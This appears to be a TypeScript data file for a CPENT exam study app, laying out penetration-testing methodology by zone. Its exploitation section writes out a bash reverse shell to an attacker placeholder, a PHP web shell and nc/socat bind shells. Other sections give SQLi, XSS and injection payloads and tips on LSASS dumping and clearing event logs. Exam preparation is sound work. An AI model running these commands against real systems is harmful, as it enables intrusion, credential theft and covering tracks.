export const EXAM_MENTAL_MODEL = {
  title: "CPENT Exam Mental Model",
  description: "Top-level decision flow. Follow this order for every engagement.",
  phases: [
    { step: 1, label: "Identify assigned zone / scope" },
    { step: 2, label: "Map reachable network + hosts" },
    { step: 3, label: "Enumerate attack surface" },
    { step: 4, label: "Initial access" },
    { step: 5, label: "Stabilize + document foothold" },
    { step: 6, label: "Enumerate locally" },
    { step: 7, label: "Identify credentials / secrets / flags" },
    { step: 8, label: "Privilege escalation if required" },
    { step: 9, label: "Pivot / lateral movement if required" },
    { step: 10, label: "Validate objectives / flags" },
    { step: 11, label: "Capture evidence" },
    { step: 12, label: "Return to report + remediation" },
  ],
}

export const STRATEGY_SECTIONS = [
  {
    id: "recon",
    title: "Recon / Network Enumeration",
    zoneId: "recon",
    badge: "OFFICIAL EXAM GUIDE",
    badgeVariant: "official",
    description:
      "Build the target map before committing to exploitation. This is the foundation for every zone.",
    phases: [
      {
        phase: "Phase 1 — Establish Your Position",
        content: "Record VPN/interface, local IP, routing table, reachable subnets, DNS configuration, assigned target range, and any filtering symptoms.",
      },
      {
        phase: "Phase 2 — Host Discovery",
        content:
          "Determine subnet → test basic reachability → use ARP discovery where applicable → use Nmap host discovery → if ICMP is filtered, use TCP-based discovery (not assume hosts are absent).",
      },
      {
        phase: "Phase 3 — Port/Service Enumeration",
        content:
          "For each host maintain a table: IP | Hostname | Ports | Service | Version | Interesting Finding | Next Action. Do not only record ports 80/443.",
      },
      {
        phase: "Phase 4 — Exam Decision Points",
        content:
          "For every discovered host ask: Is it an AD candidate? Is it a web server? Is it an IoT/device? Is it SSH/SMB/FTP/SNMP/MQTT? Is it a filtering/pivot host? Is it the gateway to another zone?",
      },
    ],
    highValueChecks: [
      "Record local IP + routing table first",
      "Use ARP for local subnet discovery (not just ICMP)",
      "TCP SYN ping + connect scan for filtered ICMP",
      "Always check common high ports (80, 443, 8080, 8000, 8443, 21, 22, 23, 25, 161, 53)",
    ],
    commonDeadEnds: [
      "Assuming ICMP-filtered means host down",
      "Only scanning top 1000 ports and missing the real service",
      "Not recording the exact Nmap output for later reference",
    ],
  },

  {
    id: "active-directory",
    title: "Active Directory",
    zoneId: "active-directory",
    badge: "OFFICIAL EXAM GUIDE",
    badgeVariant: "official",
    description:
      "The official guide describes an AD forest where the DC may not be directly accessible — you may need to pivot through another machine to gain visibility.",
    phases: [
      {
        phase: "Phase 1 — Identify the AD Structure",
        content: "Determine domain name, DNS domain, likely DC, SMB/RPC/LDAP/Kerberos exposure, candidate Windows hosts, and reachable vs unreachable systems.",
      },
      {
        phase: "Phase 2 — Unauthenticated Enumeration",
        content: "Check SMB/RPC/LDAP/domain naming and any users/groups/computers exposed — using only what the target configuration permits.",
      },
      {
        phase: "Phase 3 — Credential Discovery",
        content: "Look for exposed credentials, password reuse, AS-REP roast, Kerberoast, credentials in files/configs, and credentials from another compromised host.",
      },
      {
        phase: "Phase 4 — Lateral Movement / Domain Objective",
        content: "Treat every credential as an access hypothesis. Test against SMB/WinRM/RDP/SSH/other services. Prioritize config weaknesses, excessive privileges, credential reuse, and AD attack paths.",
      },
    ],
    highValueChecks: [
      "Enumerate SRV records first: nslookup _ldap._tcp.domain",
      "Try null session before credential attacks",
      "BloodHound for shortest attack path to DA",
      "Check for constrained/unconstrained delegation",
    ],
    commonDeadEnds: [
      "Spending time on GUI tools instead of PowerView command-line",
      "Assuming all domain users have the same access level",
      "Not checking for writable ACLs on critical objects",
    ],
  },

  {
    id: "web",
    title: "Web Applications",
    zoneId: "web",
    badge: "OFFICIAL EXAM GUIDE",
    badgeVariant: "official",
    description:
      "The guide describes multiple web vulnerabilities and security misconfigurations. After exploiting them, you must own the servers and locate secret keys.",
    phases: [
      {
        phase: "Phase 1 — Fingerprint",
        content: "Identify server, framework, CMS, app version, technologies, virtual hosts, interesting headers, robots.txt, sitemap, and exposed files.",
      },
      {
        phase: "Phase 2 — Content Discovery",
        content: "Search for hidden directories, backup files, config files, .git, upload locations, admin panels, API endpoints, alternate vhosts.",
      },
      {
        phase: "Phase 3 — Application Testing",
        content:
          "Prioritize based on what is present: auth flaws, IDOR, SQLi, command injection, LFI/traversal, file upload, SSRF, XSS (where relevant), exposed secrets, insecure config.",
      },
      {
        phase: "Phase 4 — Exploitation",
        content: "Use smallest reliable proof first. Detection → confirm vulnerability → identify impact → obtain controlled access → enumerate → locate secret/flag → continue chain if required.",
      },
      {
        phase: "Phase 5 — Post-Foothold",
        content: "Immediately determine: current user, hostname, OS, app directories, credentials/configs, env vars, DB credentials, SSH keys, other network access.",
      },
    ],
    highValueChecks: [
      "Check every input field with single quote, <script>, ${IFS}, |id",
      "Use Burp Proxy constantly",
      "Try SQLi before XSS — SQLi gives broader access",
      "Check /robots.txt and /sitemap.xml",
      "Enumerate DBs → tables → columns → dump in that order",
    ],
    commonDeadEnds: [
      "Only testing the homepage — missing hidden paths",
      "Not checking alternate vhosts",
      "Assuming WAF presence without testing",
    ],
  },

  {
    id: "binary-exploitation",
    title: "Binary Exploitation (Binaries)",
    zoneId: "binary-exploitation",
    badge: "OFFICIAL EXAM GUIDE",
    badgeVariant: "official",
    description:
      "The official guide says: identify a filtering device, map attack surface, gain access to the filtered segment, identify binaries, reverse engineer, answer questions, create exploit, obtain root-level privileges. Protections may or may not be compiled in.",
    phases: [
      {
        phase: "Phase 1 — Identify the Binary",
        content: "Architecture, endianness, ABI, dynamically/static linked, interpreter, stripped status, security protections, imported functions, strings, interesting paths.",
      },
      {
        phase: "Phase 2 — Static Analysis",
        content: "Use IDA, Ghidra, readelf, objdump, strings, checksec. For stripped binaries: rely more on cross-references, imports, strings, control-flow, function signatures, dynamic analysis.",
      },
      {
        phase: "Phase 3 — Runtime Analysis",
        content: "For native: GDB/pwndbg with breakpoints, memory mappings, register inspection, crash analysis. For non-native: QEMU/user-mode emulation with appropriate toolchain.",
      },
      {
        phase: "Phase 4 — Protection-Aware Exploitation",
        content:
          "No NX → shellcode possible. NX + weak/partial RELRO → ret2libc/GOT paths. NX + ASLR → info leak/ROP. Canary → leak/bypass required. PIE → executable base may need leaking. Full RELRO → GOT overwrite usually not the path.",
      },
      {
        phase: "Phase 5 — Validate Exploit",
        content: "Confirm controlled EIP/register state, correct offsets, stable execution, privilege gained, flag/objective obtained. Do not assume it works because it crashes.",
      },
    ],
    highValueChecks: [
      "Run checksec + file first",
      "Use ROPgadget for gadgets, one_gadget for quick wins",
      "libc-database: search by puts/fgets GOT address",
      "Check if binary is statically or dynamically linked",
    ],
    commonDeadEnds: [
      "Jumping straight to ROP without checking simple protections",
      "Not testing for basic buffer overflow first",
      "Assuming ASLR offset is fixed across runs",
    ],
  },

  {
    id: "iot-firmware",
    title: "IoT / Firmware",
    zoneId: "iot-firmware",
    badge: "OFFICIAL EXAM GUIDE",
    badgeVariant: "official",
    description:
      "The official guide: identify target → map attack surface → gain access → reverse engineer firmware → answer questions → record hard-coded credentials → analyze extracted filesystem → inspect code (often PHP or similar).",
    phases: [
      {
        phase: "Phase 1 — Target Identification",
        content: "Determine IP, MAC/vendor, open TCP/UDP ports, management interfaces, HTTP/HTTPS, SSH/Telnet, FTP, SNMP, MQTT, proprietary services, unusual high ports.",
      },
      {
        phase: "Phase 2 — Attack-Surface Mapping",
        content: "For each service: Port | Protocol | Service | Version | Auth | Interesting | Next Test. Prioritize management interfaces, default creds, hard-coded creds.",
      },
      {
        phase: "Phase 3 — Initial Access",
        content:
          "Try normal auth → test discovered/default creds → inspect exposed services → investigate proprietary service → debug/backdoor service → firmware analysis → known vulnerable component.",
      },
      {
        phase: "Phase 4 — Firmware Acquisition",
        content: "file firmware → binwalk firmware → binwalk -e firmware. Inspect SquashFS, /etc, /bin, /sbin, /usr/bin, /usr/sbin, /www, /www/cgi-bin, init/startup scripts.",
      },
      {
        phase: "Phase 5 — Filesystem Analysis",
        content: "After extracting firmware FS: search /etc for configs, /bin and /sbin for binaries, /www for web apps, init scripts for startup commands.",
      },
      {
        phase: "Phase 6 — Credential/Secret Hunting",
        content:
          "Search for: password, passwd, username, admin, root, token, key, secret, telnet, ssh, http, cgi, system, exec, popen. Hard-coded credentials are common in IoT.",
      },
      {
        phase: "Phase 7 — Binary/Web/CGI Analysis",
        content:
          "File suspicious binaries — check architecture (ARM/MIPS), dynamically/static linked. For network binaries: socket → bind → listen → accept → fork → dup2 → execve is a strong backdoor indicator.",
      },
      {
        phase: "Phase 8 — Dynamic Analysis / Emulation",
        content: "When useful: emulate firmware, run suspicious binaries with QEMU, observe network behavior, trace execution. Static analysis may be faster — don't assume full emulation is possible.",
      },
      {
        phase: "Phase 9 — Device Post-Exploitation",
        content: "Collect: id, uname -a, hostname, ip addr, ip route, /etc/passwd, /etc/os-release, ps, ss -lntup. Then investigate reachable internal services.",
      },
      {
        phase: "Phase 10 — Pivoting (if objective requires)",
        content: "IoT device becomes a network vantage point. Use chisel, ligolo, or SSHuttle. Document path: Attacker → Host A → Host B.",
      },
      {
        phase: "Phase 11 — Flags + Evidence",
        content: "Capture: target IP, service/port, firmware version, file path, relevant code/function, credential, vulnerability, exploitation result, privilege, flag/secret.",
      },
    ],
    highValueChecks: [
      "Always check binwalk after file analysis",
      "Search for 'password' and 'system(' in extracted filesystem",
      "Check for BusyBox — indicates minimal embedded environment",
      "Look for CGI scripts in /www/cgi-bin",
    ],
    commonDeadEnds: [
      "Assuming IoT always starts with a shell",
      "Not trying default credentials on management interfaces",
      "Failing to extract and inspect firmware when service is available",
    ],
  },

  {
    id: "privilege-escalation",
    title: "Privilege Escalation",
    zoneId: "privilege-escalation",
    badge: "PROJECT REFERENCE",
    badgeVariant: "standard",
    description:
      "Cross-cutting capability. Apply after initial foothold. Order of investigation differs by OS.",
    phases: [
      {
        phase: "Linux — Order of Investigation",
        content:
          "id → sudo -l → uname -a → SUID/SGID binaries → sudo misconfig → capabilities → cron → PATH/env issues → writable files/services → credentials/SSH keys → container/NFS weaknesses → kernel exploit only if justified.",
      },
      {
        phase: "Windows — Order of Investigation",
        content:
          "whoami → systeminfo → whoami /priv → local groups → services → scheduled tasks → registry → AlwaysInstallElevated → unquoted service paths → weak service/file permissions → token impersonation → credential material → kernel/software version.",
      },
    ],
    highValueChecks: [
      "Linux: find / -perm -4000 2>/dev/null for SUID binaries",
      "Linux: sudo -l for NOPASSWD entries",
      "Windows: whoami /priv for SeImpersonatePrivilege",
      "Windows: systeminfo for missing patches",
      "Always run linpeas/winpeas as a first pass",
    ],
    commonDeadEnds: [
      "Jumping immediately to kernel exploits",
      "Not checking for simple misconfigurations first",
      "Trying every SUID binary instead of prioritizing GTFOBins",
    ],
  },

  {
    id: "lateral-movement",
    title: "Lateral Movement / Pivoting",
    zoneId: "lateral-movement",
    badge: "PROJECT REFERENCE",
    badgeVariant: "standard",
    description:
      "The official guide explicitly mentions pivoting in AD and CTF descriptions. Movement is always scoped-dependent.",
    phases: [
      {
        phase: "Decision Flow",
        content:
          "Current foothold → enumerate interfaces/routes → identify hidden subnet → identify reachable hosts → enumerate services from new vantage point → reuse discovered credentials → move to next target.",
      },
      {
        phase: "Tunneling Techniques",
        content:
          "SSH -D 1080 for SOCKS proxy → proxychains for TCP tools. Chisel for HTTP/SOCKS5 reverse proxies. SSHuttle for transparent VPN-like routing. Ligolo for clean multi-hop tunneling.",
      },
    ],
    highValueChecks: [
      "Check port 445, 135, 139 first — SMB/RPC are primary pivot targets",
      "SSHuttle > proxychains for full subnet routing",
      "Document every pivot: Attacker → Host A → Host B",
      "Use ligolo for Windows environments, chisel for Linux",
    ],
    commonDeadEnds: [
      "Not checking for SMB null sessions before credential attacks",
      "Forgetting to set terminal type inside proxied shells",
      "Not testing if discovered credentials work on internal-only hosts",
    ],
  },

  {
    id: "post-exploitation",
    title: "Post-Exploitation",
    zoneId: "post-exploitation",
    badge: "PROJECT REFERENCE",
    badgeVariant: "standard",
    description:
      "After every foothold: harvest credentials early, establish C2 before lateral movement, clean up artifacts before exam window closes.",
    phases: [
      {
        phase: "Phase 1 — Identity",
        content: "whoami, id, hostname — confirm current access level.",
      },
      {
        phase: "Phase 2 — Network",
        content: "ip addr, ip route, ss -lntup — map internal network and listening services.",
      },
      {
        phase: "Phase 3 — Secrets",
        content:
          "Look for: configs, env vars, credentials, SSH keys, app secrets, database passwords, history files (.bash_history, /proc/self/environ).",
      },
      {
        phase: "Phase 4 — Objective Tracking",
        content:
          "Is there a flag here? Is this machine a pivot? Is there another subnet? Did I discover credentials? Do those work elsewhere? Is privilege escalation required? Is this host only a stepping stone?",
      },
    ],
    highValueChecks: [
      "Dump LSASS with ProcDump or Mimikatz in-memory",
      "Check for DA tokens before domain dominance",
      "Screenshot flags immediately after access",
      "BloodHound for shortest path to domain admin",
    ],
    commonDeadEnds: [
      "Lingering on a box without extracting hashes",
      "Not checking env vars for injected credentials",
      "Forgetting to clear event logs before moving on",
    ],
  },

  {
    id: "ctf",
    title: "CTF Challenges",
    zoneId: "ctf",
    badge: "PRACTICE / INFERENCE",
    badgeVariant: "inference",
    description:
      "The official guide mentions Linux/web CTF-style environments, security misconfigs, exploitation, pivoting, and locating secret keys. This is practice-oriented methodology.",
    phases: [
      {
        phase: "Phase 1 — Initial File Analysis",
        content: "file <target>, binwalk -e, exiftool <target>, strings <target>. Determine true type — magic bytes can lie.",
      },
      {
        phase: "Phase 2 — Decoding & Encoding",
        content: "Try base64, base32, base85, URL-decode, hex-decode, ROT13, Morse. Check if one decode leads to another layer.",
      },
      {
        phase: "Phase 3 — Steganography",
        content: "steghide extract -sf <file> -p '' (try empty passphrase). zsteg -a for PNG LSB. Stegsolve for color plane analysis.",
      },
      {
        phase: "Phase 4 — Cryptography",
        content: "hash-identifier → hashcat/crackstation. RSA: check factordb. XOR: single-byte and multi-byte with common keys.",
      },
      {
        phase: "Phase 5 — Forensics",
        content: "volatility imageinfo → pslist → netscan → filescan. Check for deleted files with foremost/scalpel.",
      },
      {
        phase: "Phase 6 — Web CTF",
        content: "Test SQLi auth bypass: admin' OR '1'='1' --. XSS: <script>alert(1)</script>. Command injection: ;id, |id, $(id).",
      },
    ],
    highValueChecks: [
      "Try steghide with empty passphrase first — most common in CTF",
      "Check metadata with exiftool on every file",
      "XOR with 0x41 (A), 0x20 (space), and try single-byte bruteforce",
      "Flag format is usually CPENT{...} or CTF{...}",
    ],
    commonDeadEnds: [
      "Not reading the challenge description carefully",
      "Missing hidden data in PNG chunks or file extensions",
      "Assuming one decode layer when there are multiple",
    ],
  },

  {
    id: "password-attacks",
    title: "Password Attacks",
    zoneId: "password-attacks",
    badge: "PROJECT REFERENCE",
    badgeVariant: "standard",
    description: "Cracking, brute forcing, password spraying, and credential reuse strategies.",
    phases: [
      {
        phase: "Phase 1 — Identify Hash Type",
        content: "hash-identifier <hash>. Check length: 32 hex = NTLM, 40 hex = SHA1, 64 hex = SHA256.",
      },
      {
        phase: "Phase 2 — Wordlist Attack",
        content: "hashcat -m <mode> -a 0 hash.txt rockyou.txt. Try best64.rule for mangling.",
      },
      {
        phase: "Phase 3 — Brute Force (last resort)",
        content: "hashcat -m <mode> -a 3 hash.txt ?a?a?a?a?a?a — only for short passwords.",
      },
      {
        phase: "Phase 4 — Password Spraying",
        content: "Use 5-10 common passwords against many accounts to avoid lockouts. hydra -L users.txt -P passwords.txt.",
      },
    ],
    highValueChecks: [
      "Use rockyou.txt first — most common passwords",
      "Hashcat rule: best64.rule",
      "For Kerberoasting, crack offline with -m 13100",
      "For AS-REP, online attack with kerbrute",
    ],
    commonDeadEnds: [
      "Trying to crack before identifying hash type",
      "Pure brute force on long hashes",
      "Not trying common passwords in web login forms",
    ],
  },

  {
    id: "exploitation-frameworks",
    title: "Exploitation Frameworks",
    zoneId: "exploitation-frameworks",
    badge: "PRACTICE / INFERENCE",
    badgeVariant: "inference",
    description: "Reverse shell generation, delivery, and stabilization. Searchsploit for quick wins.",
    phases: [
      {
        phase: "Phase 1 — Reverse Shell Selection",
        content:
          "Linux: bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'. Windows: PowerShell IEX one-liner or Nishang. PHP: <?php system($_GET['cmd']); ?>.",
      },
      {
        phase: "Phase 2 — Bind Shell Alternatives",
        content: "If reverse shell blocked by egress: nc -l -p 4444 -e /bin/bash or socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash.",
      },
      {
        phase: "Phase 3 — Shell Stabilization",
        content: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'. Ctrl+Z → stty raw -echo → fg → export TERM=xterm.",
      },
      {
        phase: "Phase 4 — Exploit Search",
        content: "searchsploit <keyword>. Metasploit: db_nmap, use exploit/multi/handler. Routersploit for IoT-specific targets.",
      },
    ],
    highValueChecks: [
      "Test reverse shell connectivity with nc listener BEFORE payload delivery",
      "Always use rlwrap with nc -lvnp for command history",
      "Python pty.spawn for interactive shell on Linux",
      "Searchsploit first — fast CVE lookup with local exploit copy",
    ],
    commonDeadEnds: [
      "Trying every reverse shell variant instead of testing the simplest first",
      "Not setting up listener before sending payload",
      "Forgetting to URL-encode special characters in web payloads",
    ],
  },
]

export const IOTGOAT_DRILL = {
  title: "IoTGoat shellback — Bind Shell Recognition Drill",
  objective:
    "Understand how to recognize a network-facing ARM binary that provides shell access.",
    id: "iotgoat-shellback-drill",
  inputs: [
    "shellback",
    "ARM 32-bit",
    "EABI5",
    "mMusl ARMHF",
    "BusyBox",
  ],
  keyStaticIndicators: [
    "socket()",
    "bind()",
    "listen()",
    "accept()",
    "fork()",
    "dup2()",
    "execve()",
    "/bin/busybox",
    "sh",
  ],
  expectedReasoning: [
    "network socket",
    "→ bind/listen",
    "→ accept incoming connection",
    "→ duplicate socket onto stdin/stdout/stderr",
    "→ launch BusyBox shell",
  ],
  disclaimer:
    "This is a practice scenario. The official CPENT IoT guide requires identifying the target, mapping the attack surface, gaining access, reverse engineering firmware, recording hard-coded credentials, and analyzing the extracted filesystem/code. The exact initial-access mechanism is environment-dependent.",
}
